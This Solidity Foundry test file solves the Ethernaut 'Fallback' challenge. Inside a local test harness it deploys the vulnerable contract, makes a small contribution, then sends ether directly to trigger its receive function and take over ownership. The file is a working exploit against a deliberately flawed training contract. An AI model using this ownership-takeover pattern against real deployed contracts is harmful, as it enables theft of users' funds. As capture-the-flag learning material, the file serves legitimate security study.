// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import '../../src/EthernautCTF/Fallback.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

contract FallbackExploit is Test {
  Fallback target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new Fallback();
    console2.log('Target contract deployed');
    vm.stopPrank();
    vm.deal(exploiter, 1 ether);
  }

  function testExploit() public {
    address owner = target.owner();
    console2.log('Current owner: %s', owner);
    assertEq(owner, deployer);

    vm.startPrank(exploiter);
    // Contribute once to make sure the exploiter balance is above zero.
    target.contribute{value: 0.0001 ether}();
    // Send a small amount of ether (more than 0 ether) to trigger the `receive` method.
    (bool success, ) = address(target).call{value: 0.0001 ether}('');
    require(success, 'Low-level call failed');
    vm.stopPrank();

    owner = target.owner();
    console2.log('New owner: %s', owner);
    assertEq(owner, exploiter);
  }
}
